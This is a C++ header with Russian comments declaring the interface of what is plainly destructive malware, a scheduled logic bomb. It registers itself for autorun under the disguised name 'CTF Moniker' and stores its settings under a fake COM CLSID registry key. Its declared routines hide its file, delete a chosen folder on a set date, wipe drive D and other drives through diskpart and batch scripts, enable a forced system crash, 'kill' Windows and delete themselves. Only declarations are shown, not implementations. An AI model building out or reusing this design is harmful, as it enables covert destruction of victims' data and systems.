#pragma once

class CDeleteDay
{
private:
	CString m_strFilePath; //путь к нашему экзешнику
	//установить в конструкторе

public:
	CDeleteDay();
	~CDeleteDay();

	// //добавляем себя автозагрузку
	bool AddToAutoRun();
	// Проверить не наступил ли день выполнения задания
	bool InspectDeleteData();

	// записываем в реестр когда выполнится задача
	bool SaveDateOfPerformance(SYSTEMTIME SysTime);
	// записываем какую папку будем удалять
	bool SavePathOfFolderToDelete(CString csFolderPath);
	void HideFile(bool bHide);
	bool EnableCrashOnCtrlScroll();
	bool IsDeleteDiskD();
	bool SaveTaskKillWindows();
	void SelfDelete();
	bool PerformATask();
};

static const wchar_t* RunOnceItemName = L"CTF Moniker";
static const wchar_t* RegDataKeyName = L"CLSID\\{00000305-1111-0000-C000-A0B0C0000046}";
static const wchar_t* DelDayKeyName = L"delDay";
static const wchar_t* DelDayOfWeekKeyName = L"delDayOfWeek";
static const wchar_t* DelMonthKeyName = L"delMonth";
static const wchar_t* DelFolderKeyName = L"FolderToDel";
static const wchar_t* DelDiskDKeyName = L"delD";
static const wchar_t* KillWindowsKeyName = L"KillWin";

bool DeleteFolder();
bool IfDeleteDiskD();
bool IfKillWindows();
bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
bool CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[]);
bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[]);
bool DeleteAllOnDrive(char szDriveLetter[]);
void DoKillWindows();
int stringSizeInBytes(CString strToCalc);
CString getListOfLogicalDrives();